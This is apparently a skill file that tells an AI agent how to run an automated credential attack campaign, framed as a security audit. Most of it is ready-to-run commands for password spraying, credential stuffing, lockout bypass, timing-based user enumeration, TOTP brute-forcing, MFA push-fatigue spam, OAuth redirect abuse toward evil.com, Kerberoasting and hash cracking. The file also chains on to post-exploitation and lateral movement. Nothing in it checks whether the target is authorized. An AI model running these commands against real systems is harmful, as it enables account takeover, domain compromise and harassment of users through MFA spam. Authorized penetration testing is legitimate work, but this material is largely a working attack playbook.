---
name: credential-audit
description: |
  Authentication and credential security assessment. Tests password brute-force, credential stuffing, password spraying, default credential testing, credential harvesting, lockout analysis, MFA bypass, OAuth/OIDC abuse, session token entropy, Kerberos attacks, and intelligent wordlist generation.

  Uses hydra, john, ncrack, medusa, cewl, crunch, netexec, impacket, kerbrute, and nuclei default-login templates. Covers OWASP A07:2021 Identification and Authentication Failures.
argument-hint: <target> [service=ssh|ftp|http|smb|rdp|mysql|...] [depth=quick|standard|thorough] [userlist=path] [passlist=path]
user-invocable: true
---

# Authentication & Credential Audit

You are an expert credential security tester. Your goal: systematically test authentication mechanisms for weaknesses — default credentials, weak passwords, credential reuse, lockout bypass, MFA weaknesses, OAuth/OIDC flaws, session token entropy, Kerberos attacks, and credential harvesting. Report every confirmed authentication failure with evidence.

**Request:** $ARGUMENTS

---

## Tools Available

| Tool | Use for |
|------|---------|
| `start_scan` | Define target, scope, depth, and hard limits — **always call this first** |
| `complete_scan` | Mark the scan done and write final notes |
| `run_nuclei` | Default credential templates — fast check for known default logins |
| `run_nmap` | Service detection — identify auth-enabled services |
| `kali_exec` | Kali tools: hydra, john, ncrack, medusa, cewl, crunch, hashcat, netexec, kerbrute, impacket |
| `http_request` | Raw HTTP — manual auth testing, cookie analysis, OAuth flows. Set `poc=True` for confirmed exploits |
| `save_poc` | Save a confirmed exploit as a raw `.http` file in `pocs/` |
| `report_finding` | Log a confirmed vulnerability with evidence to findings.json |
| `report_diagram` | Save a Mermaid diagram to findings.json |
| `start_dashboard` | Serve dashboard.html at localhost:5000 |
| `log_note` | Write a reasoning note or decision to the session log |

---

## Attack Techniques

| Technique | ATT&CK | Tools |
|-----------|--------|-------|
| **Password Guessing** | T1110.001 | `hydra`, `nuclei` |
| **Password Cracking** | T1110.002 | `john`, `hashcat` |
| **Password Spraying** | T1110.003 | `hydra`, `netexec` |
| **Credential Stuffing** | T1110.004 | `hydra`, `medusa` |
| **Default Credentials** | T1078.001 | `nuclei`, `hydra` |
| **Credential in Files** | T1552.001 | `trufflehog`, `grep` |
| **Kerberos Attacks** | T1558 | `impacket`, `kerbrute`, `john` |
| **MFA Bypass** | T1111 | `http_request`, manual |
| **OAuth/OIDC Abuse** | T1550.001 | `http_request`, `kali_exec` |
| **Timing Enumeration** | T1589.001 | `http_request`, `kali_exec` |
| **Session Token Analysis** | T1539 | `kali_exec`, `http_request` |

---

## Depth Presets

| Depth | What runs | Limits |
|-------|-----------|--------|
| `quick` | Default creds (nuclei) + top-100 passwords | $0.10 · 10 min · 8 calls |
| `standard` | Quick + spraying + custom wordlist + lockout detection + timing enumeration | $0.50 · 30 min · 20 calls |
| `thorough` | Standard + hash cracking + MFA bypass + OAuth + session analysis + Kerberos | $2.00 · 90 min · 50 calls |

---

## Workflow

### Before running any tool

If depth/service is unspecified, ask:

> **Target:** `<target>` | **Service(s):** `<detected or unknown>`
> - `quick` — default creds + top-100 *($0.10 · 10 min · 8 calls)*
> - `standard` — + spraying + lockout detection *($0.50 · 30 min · 20 calls)*
> - `thorough` — + MFA bypass + OAuth + Kerberos *($2.00 · 90 min · 50 calls)*
> Any known usernames, captured hashes, or rate limiting concerns?

---

### Phase 0 — Scope & Setup

0. `start_scan` with target, depth, limits
1. `start_dashboard`
2. `log_note` — record target services, known usernames, auth mechanisms

---

### Phase 1 — Service Discovery & Auth Fingerprinting

1. **Identify auth services**:
   ```
   scan(tool="nmap", target=HOST, options={"ports": "21,22,23,25,80,88,110,143,389,443,445,636,993,1433,3306,3389,5432,5900,6379,8080,8443,27017"})
   ```

2. **Probe web auth** via `http_request`: find login pages, identify auth type (form/basic/bearer/OAuth/SAML), check for CAPTCHA, note error messages ("Invalid username" vs "Invalid credentials" = user enumeration)

3. `log_note` + `report_diagram` with auth architecture (login form, auth service, DB, LDAP, MFA, OAuth paths)

---

### Phase 2 — Default Credential Testing

Run `scan(tool="nuclei", target=URL, options={"templates": "default-login"})` in parallel with service-specific defaults:

| Service | Command |
|---------|---------|
| SSH | `hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt TARGET ssh -t 4` |
| FTP | Same wordlists, `TARGET ftp -t 4` |
| MySQL | `-l root`, same pass list, `TARGET mysql -t 4` |
| PostgreSQL | `-l postgres`, `TARGET postgres -t 4` |
| SMB | `nxc smb TARGET -u administrator -p /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt` |
| RDP | `-l administrator`, `TARGET rdp -t 4` |
| MSSQL | `-l sa`, `TARGET mssql -t 4` |
| Redis | `redis-cli -h TARGET -a password` |
| MongoDB | `mongosh --host TARGET --eval 'db.adminCommand({listDatabases:1})'` |

**Default credential discovery methodology:**

1. **GitHub dorks**: `curl -s 'https://api.github.com/search/code?q=default+password+VENDOR+extension:md' | jq '.items[:5] | .[].html_url'` — search install guides, Docker entrypoints, Helm values.yaml
2. **Exploit-DB**: `searchsploit 'default password PRODUCT' --json | jq '.RESULTS_EXPLOIT[:5]'`
3. **Vendor docs**: installation guides (first-run passwords), API docs (example auth headers), Docker image env vars (`docker inspect IMAGE | jq '.[0].Config.Env'`)
4. **Shodan**: `http.title:"PRODUCT" "login"` for exposed panels, `product:"PRODUCT" port:8080` for mgmt interfaces
5. **SecLists lookup**: `grep -i 'PRODUCT' /usr/share/seclists/Passwords/Default-Credentials/default-credentials.csv | head -20`

---

### Phase 3 — Lockout Threshold Detection (standard+)

Determine exact lockout threshold via binary search before spraying.

**Algorithm** — use a sacrificial account:

1. Send **3 wrong passwords**: `hydra -l testuser -P <(printf 'wrong1\nwrong2\nwrong3\n') TARGET ssh -t 1 -W 2`. Verify account still active (response says "invalid password" not "locked"). If active: threshold > 3.
2. Send **2 more** (total 5). If locked: threshold is 4 or 5. If active: threshold > 5.
3. **Narrow**: fresh account, exactly 4 attempts. Still active = threshold is 5. Locked = threshold is 4.
4. If > 5: try 10, then 7 or 15, continue binary search.

**Lockout signals**: HTTP 423/429, "locked"/"disabled"/"too many attempts" in body, response time > 2x baseline, connection refused.

**Lockout duration**: after triggering, test at 1min, 5min, 15min, 30min intervals:
```
kali(command="sleep 60 && curl -s -o /dev/null -w '%{http_code}' -X POST https://TARGET/login -d 'user=testuser&pass=wrong'")
```

**Bypass techniques**: IP rotation, username case variation (`Admin`/`admin`/`ADMIN`), Unicode normalization (`adm\u0131n`), concurrent requests before counter increments, different auth endpoints (`/login` vs `/api/auth` may not share lockout state).

Use `threshold - 1` as max attempts per account in all spraying.

---

### Phase 4 — Timing-Based User Enumeration (standard+)

Valid usernames trigger password hash comparison (slow); invalid usernames return immediately (fast).

1. **Baseline** — 10 requests with known-invalid usernames:
   ```
   kali(command="for i in $(seq 1 10); do curl -s -o /dev/null -w '%{time_total}\n' -X POST https://TARGET/login -d 'user=definitelynotauser_$i&pass=wrongpass'; done")
   ```

2. **Test candidates** — 3 samples each:
   ```
   kali(command="for user in admin root administrator operator service backup; do echo -n \"$user: \"; for i in 1 2 3; do curl -s -o /dev/null -w '%{time_total} ' -X POST https://TARGET/login -d \"user=$user&pass=wrongpass\"; done; echo; done")
   ```

3. **Analysis**: discard first request (cold cache). Consistent > 2x baseline = valid user.

**LDAP timing**: bind as `user@DOMAIN` with wrong password — "Invalid credentials" + slow = valid; "No such object" + fast = invalid.

**SSH timing** (CVE-2016-6210): `/usr/bin/time -f '%e' ssh -o BatchMode=yes -o ConnectTimeout=5 USER@TARGET` — valid users take longer due to hash computation.

**SMTP** (complementary): `smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t TARGET`

Add confirmed users to `/tmp/valid-users.txt` for spraying.

---

### Phase 5 — Advanced Wordlist Mutation (standard+)

1. **CeWL**: `cewl TARGET -d 2 -m 5 -w /tmp/cewl-words.txt --count`
2. **John best64 rules** (64 most effective mutations — append digits, toggle case, reverse):
   ```
   kali(command="john --wordlist=/tmp/cewl-words.txt --rules=best64 --stdout | head -5000 > /tmp/mutated.txt")
   ```
   | Rule | What it does | When to use |
   |------|-------------|-------------|
   | `best64` | Top 64 mutations | Always — first pass |
   | `d3ad0ne` | 34K+ competition rules | Thorough — smaller wordlists only |
   | `KoreLogic` | Enterprise patterns (Company2024!) | Corporate targets |
   | `Single` | Username-derived mutations | When you have usernames |

3. **Keyboard walks**: `qwerty123`, `1qaz2wsx`, `!QAZ2wsx`, `1q2w3e4r5t`, `zaq12wsx`, `qazwsxedc`, `asdfghjkl`, `0987654321`
4. **Mask attacks** — corporate password patterns:
   ```
   # Company+Year+Char: Company2024!
   kali(command="for word in $(head -5 /tmp/cewl-words.txt); do for year in 2023 2024 2025 2026; do for c in '!' '@' '#' ''; do echo \"${word^}${year}${c}\"; done; done; done > /tmp/masks.txt")
   # Season+Year: Summer2024!, Winter2025@
   kali(command="for s in Spring Summer Autumn Winter Fall; do for y in 2024 2025 2026; do for c in '!' '@' '#' ''; do echo \"${s}${y}${c}\"; done; done; done >> /tmp/masks.txt")
   ```
5. **Leetspeak**: `sed 's/a/@/g; s/e/3/g; s/i/1/g; s/o/0/g; s/s/$/g'` on CeWL output
6. **Merge all**: `cat /tmp/mutated.txt /tmp/masks.txt /tmp/leet.txt /tmp/keyboard-walks.txt | sort -u > /tmp/final-wordlist.txt`

---

### Phase 6 — Cross-Service Credential Spray (standard+)

**Single-service spray** (respect lockout threshold from Phase 3):
```
kali(command="hydra -L /tmp/valid-users.txt -p 'Password123!' TARGET ssh -t 2 -W 5")
kali(command="nxc smb TARGET -u /tmp/valid-users.txt -p 'Company2024!' --continue-on-success")
```

**Cross-service automation** — when creds found on one service, test all others:
```
kali(command="echo '--- SMB ---' && nxc smb TARGET -u founduser -p 'foundpass'; \
  echo '--- RDP ---' && nxc rdp TARGET -u founduser -p 'foundpass'; \
  echo '--- SSH ---' && nxc ssh TARGET -u founduser -p 'foundpass'; \
  echo '--- WINRM ---' && nxc winrm TARGET -u founduser -p 'foundpass'; \
  echo '--- MSSQL ---' && nxc mssql TARGET -u founduser -p 'foundpass'; \
  echo '--- FTP ---' && nxc ftp TARGET -u founduser -p 'foundpass'")
```

**Multi-host multi-protocol sweep:**
```
kali(command="for proto in smb rdp ssh winrm mssql; do echo \"=== $proto ===\"; nxc $proto TARGET_RANGE -u /tmp/valid-users.txt -p 'Password123!' --continue-on-success 2>&1 | grep -E '\\+|SUCCESS'; done")
```

**Services not in netexec**: use hydra for PostgreSQL (`postgres`), Oracle (`oracle-listener`), HTTP Basic (`http-get /admin`), HTTP POST form.

Call `report_finding` immediately for every working credential pair.

---

### Phase 7 — MFA Bypass Testing (thorough)

**MFA Bypass Matrix:**

| # | Technique | Test method |
|---|-----------|-------------|
| 1 | **Step-up parameter removal** | Remove `mfa_required`/`otp`/`totp_code` from POST body, replay auth request. Some enforce MFA client-side only |
| 2 | **Response manipulation** | Change `"mfa_required": true` to `false`, or `"status": "mfa_pending"` to `"authenticated"` in response |
| 3 | **TOTP brute-force window** | 30-sec TOTP window = 3 valid codes (prev/current/next). 6-digit = 1M possibilities. At 1 req/sec, ~30 codes/window. No rate limit = brute-force in ~9.3 hours |
| 4 | **Backup code testing** | Often 8-digit numeric. Check if backup endpoint has separate rate limiting. Try `00000000`, `12345678`, `11111111` |
| 5 | **MFA fatigue (push spam)** | For Duo/MS Authenticator: send 20+ push requests spaced 2-3sec apart. Users approve from frustration |
| 6 | **Session reuse post-MFA** | Capture session token after MFA, logout, replay token. Check if server validates MFA on every request or only at login |
| 7 | **MFA disable via recovery** | Reset password, check if MFA auto-disables. Test "forgot password" + "remember device" interaction |
| 8 | **Different auth path** | Test ALL paths: `/login`, `/api/auth`, `/m/login`, `/v1/login`, SSO callback, OAuth token endpoint |

**Key commands:**
```
# Technique 1: omit OTP field entirely
http_request(url="https://TARGET/api/auth/verify", method="POST", body={"username": "user", "password": "pass"})

# Technique 3: TOTP brute-force
kali(command="for code in $(seq -w 000000 000100); do RESP=$(curl -s -o /dev/null -w '%{http_code}' -X POST https://TARGET/api/verify-mfa -d \"{\\\"code\\\":\\\"$code\\\"}\" -H 'Content-Type: application/json' -H 'Cookie: session=TOKEN'); echo \"$code: $RESP\"; [ \"$RESP\" = \"200\" ] && break; done")

# Technique 5: push fatigue
kali(command="for i in $(seq 1 20); do curl -s -X POST https://TARGET/api/push-mfa -d '{\"username\":\"target_user\"}' -H 'Content-Type: application/json'; sleep 3; done")

# Technique 6: session reuse after logout
http_request(url="https://TARGET/api/logout", method="POST", headers={"Cookie": "session=MFA_TOKEN"})
http_request(url="https://TARGET/api/dashboard", method="GET", headers={"Cookie": "session=MFA_TOKEN"})
```

---

### Phase 8 — OAuth/OIDC Credential Testing (thorough)

**Grant type confusion** — test if server accepts unintended grants:
```
# ROPC (should be disabled): bypasses user interaction
http_request(url="https://TARGET/oauth/token", method="POST", body={"grant_type": "password", "username": "admin", "password": "admin", "client_id": "CLIENT_ID"})
# client_credentials: may issue tokens without user context
http_request(url="https://TARGET/oauth/token", method="POST", body={"grant_type": "client_credentials", "client_id": "CLIENT_ID", "client_secret": "SECRET"})
# implicit (deprecated): direct token in URL fragment
http_request(url="https://TARGET/oauth/authorize?response_type=token&client_id=CLIENT_ID&redirect_uri=https://evil.com/cb&scope=openid", method="GET")
```

**Scope escalation** — request privileged scopes: `scope=openid+profile+admin+write+users:manage`

**Redirect URI manipulation:**
- Open redirect: `redirect_uri=https://evil.com/callback`
- Path traversal: `redirect_uri=https://app.TARGET/callback/../../../attacker`
- URL encoding: `redirect_uri=https://app.TARGET%40evil.com/callback`
- Fragment injection: `redirect_uri=https://app.TARGET/callback%23@evil.com`
- Subdomain takeover: `redirect_uri=https://staging.TARGET/callback`

**PKCE downgrade** — request auth code without `code_challenge`, exchange without `code_verifier`. Should fail if PKCE enforced.

**Auth code replay** — use same authorization code twice; second use should fail.

**Client secret brute-force:**
```
kali(command="for s in $(cat /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt); do R=$(curl -s -o /dev/null -w '%{http_code}' -X POST https://TARGET/oauth/token -d \"grant_type=client_credentials&client_id=CID&client_secret=$s\"); echo \"$s: $R\"; [ \"$R\" = \"200\" ] && break; done")
```

**Token exchange abuse (RFC 8693)** — exchange user token for admin-scoped token via `grant_type=urn:ietf:params:oauth:grant-type:token-exchange`

---

### Phase 9 — Session Token Entropy Analysis (thorough)

1. **Collect 20+ tokens**: login repeatedly, extract from Set-Cookie headers:
   ```
   kali(command="for i in $(seq 1 20); do curl -s -D - -X POST https://TARGET/login -d 'user=test&pass=test' | grep -i 'set-cookie' | sed 's/.*session=//; s/;.*//'; done > /tmp/tokens.txt")
   ```

2. **Shannon entropy**:
   ```
   kali(command="python3 -c \"
import math, collections
tokens = open('/tmp/tokens.txt').read().strip().split('\n')
for t in tokens[:5]:
    freq = collections.Counter(t)
    ent = -sum((c/len(t))*math.log2(c/len(t)) for c in freq.values())
    print(f'{t[:20]}... len={len(t)} ent={ent:.2f}b/char total={ent*len(t):.0f}b')
\"")
   ```
   Secure: > 4.0 bits/char, > 128 bits total. Below 64 bits = brute-forceable.

3. **Sequential pattern detection**:
   ```
   kali(command="python3 -c \"
tokens = open('/tmp/tokens.txt').read().strip().split('\n')
try:
    nums = [int(t,16) for t in tokens]
    diffs = [nums[i+1]-nums[i] for i in range(len(nums)-1)]
    if len(set(diffs))==1: print(f'CRITICAL: strictly sequential, increment={diffs[0]}')
    elif max(diffs)-min(diffs)<100: print(f'WARNING: nearly sequential, range={min(diffs)}-{max(diffs)}')
except: print('Not numeric/hex sequences')
prefixes = set(t[:8] for t in tokens)
if len(prefixes) < len(tokens)/2: print('WARNING: shared prefixes — timestamp-based?')
\"")
   ```

4. **Timestamp detection** — base64-decode tokens, check if first 4 bytes are a Unix timestamp (1600000000-2000000000 range). Check hex prefix similarly.

---

### Phase 10 — Kerberos Credential Attacks (thorough, AD environments)

**AS-REP Roasting** — accounts without pre-authentication:
```
kali(command="impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile /tmp/valid-users.txt -format hashcat -outputfile /tmp/asrep.txt")
kali(command="john --wordlist=/tmp/final-wordlist.txt --format=krb5asrep /tmp/asrep.txt && john --show /tmp/asrep.txt")
```

**Kerberoasting** — extract TGS hashes for service accounts (requires any valid domain cred):
```
kali(command="impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request -outputfile /tmp/kerberoast.txt")
```
- `$krb5tgs$23$` = RC4 (fast to crack, prioritize)
- `$krb5tgs$18$` = AES256 (slow, deprioritize)

**Offline cracking priority:**

| Priority | Method | Rule/Wordlist |
|----------|--------|---------------|
| 1 | Target wordlist + best64 | `/tmp/final-wordlist.txt` + `--rules=best64` |
| 2 | Keyboard walks + masks | `/tmp/keyboard-walks.txt` + `/tmp/masks.txt` |
| 3 | rockyou + best64 | `/usr/share/wordlists/rockyou.txt` + `--rules=best64` |
| 4 | CeWL + KoreLogic | `/tmp/cewl-words.txt` + `--rules=KoreLogic` |
| 5 | rockyou + d3ad0ne | Last resort — very slow |

**Kerbrute enumeration** (no account required):
```
kali(command="kerbrute userenum --dc DC_IP -d DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt --output /tmp/kerbrute-valid.txt 2>&1 | tail -20")
```

---

### Phase 11 — Hash Cracking & Web Auth Testing (thorough)

**Hash cracking** (from DB dumps, NTLM, SAM, etc.):
1. Identify: `hashid 'HASH'` + `john --list=formats | grep -i FORMAT`
2. Crack: `john --wordlist=/usr/share/wordlists/rockyou.txt --format=FORMAT /tmp/hashes.txt`
3. Rules: `john --wordlist=/tmp/final-wordlist.txt --rules=best64 --format=FORMAT /tmp/hashes.txt`
4. Show: `john --show /tmp/hashes.txt`

**Web auth testing:**
- **Session management**: cookie flags (Secure, HttpOnly, SameSite), session fixation, logout invalidation
- **JWT**: `alg: none`, RS256-to-HS256 key confusion, expired token replay, sensitive data in payload
- **Password policy**: min length (1/3/6 char), complexity (all lowercase), common password rejection, password reuse

---

### Phase 12 — Verification & PoC

For every confirmed finding:

1. `log_note` — what was confirmed
2. Verify access — actually log in with discovered credentials
3. `http_request(poc=True)` for web findings
4. `save_poc` with descriptive title (e.g., `default-creds-admin`, `mfa-bypass-param-removal`, `oauth-scope-escalation`)
5. `report_finding` — severity: Critical (admin/MFA bypass), High (user access/OAuth abuse), Medium (weak tokens/enumeration), Low (best practice gaps)

---

### Phase 13 — Report & Wrap-Up

1. `report_diagram` — credential attack surface diagram
2. `log_note` with summary:
```
Credential Audit Summary:
  Default credentials:    [count] services — [findings]
  Lockout threshold:      [N] attempts / [duration]
  User enumeration:       [count] users via [method]
  Password spraying:      [users] x [passwords] — [findings]
  Cross-service reuse:    [creds] across [services] — [findings]
  MFA bypass:             [techniques] tested — [findings]
  OAuth/OIDC:             [tests] — [findings]
  Session entropy:        [bits] bits — [adequate/weak]
  Hash cracking:          [total] hashes — [cracked] cracked
  Kerberos:               [AS-REP/Kerberoast] — [findings]
```
3. `complete_scan`
4. Invoke `/gh-export`

---

## Finding Severity Guide

| Severity | Criteria | Examples |
|----------|----------|---------|
| **Critical** | Admin/root access, MFA fully bypassed, mass credential compromise, domain admin via Kerberos | Default admin creds on production; MFA disabled via account recovery; AS-REP roast cracks domain admin |
| **High** | Regular user access, OAuth scope escalation, session prediction, partial MFA bypass | Spray finds 5 accounts; client_credentials issues admin tokens; push fatigue succeeds |
| **Medium** | Weak policy, low entropy, user enumeration, lockout bypass | No complexity requirements; tokens < 64 bits; timing reveals 20 valid users |
| **Low** | Informational, best practice gaps | Missing Secure flag; high lockout threshold (20); password reuse allowed |

---

## Chaining Other Skills

| Skill | When to invoke |
|-------|----------------|
| `/post-exploit` | Valid credentials obtained — post-exploitation and lateral movement |
| `/lateral-movement` | Credentials work across multiple services — test lateral movement paths |
| `/analyze-cve` | Auth library has a known CVE — trace exploitability |
| `/gh-export` | Always — after `complete_scan` |

---

## Rules

- **`start_scan` is mandatory** — never run any other tool before it
- **Batch independent tools in the same response** — they execute in parallel
- When any tool returns a LIMIT message, stop immediately and call `complete_scan`
- **Detect lockout threshold BEFORE spraying** — binary search (Phase 3), then use `threshold - 1`
- **Start with default credentials** — always test vendor defaults before brute-force
- **Build custom wordlists** — cewl + john rules + mask attacks beat generic wordlists
- **Spray over brute-force** — 2 passwords x 1000 users beats 1000 passwords x 1 user
- **Test credential reuse cross-service** — every found credential pair must hit all discovered services
- **Call `report_finding` for every confirmed credential** — include service, username, verified access
- **For every confirmed exploit**: call `http_request(poc=True)` AND `save_poc`
- **Use `log_note` liberally** — document reasoning for wordlist choices and attack strategy
- **Never fabricate findings** — only report credentials you actually verified
- **Mermaid syntax rules**: `flowchart TD`, quote labels, no em-dashes, short alphanumeric node IDs
- Call `stop_kali` at the end if `kali_exec` was used
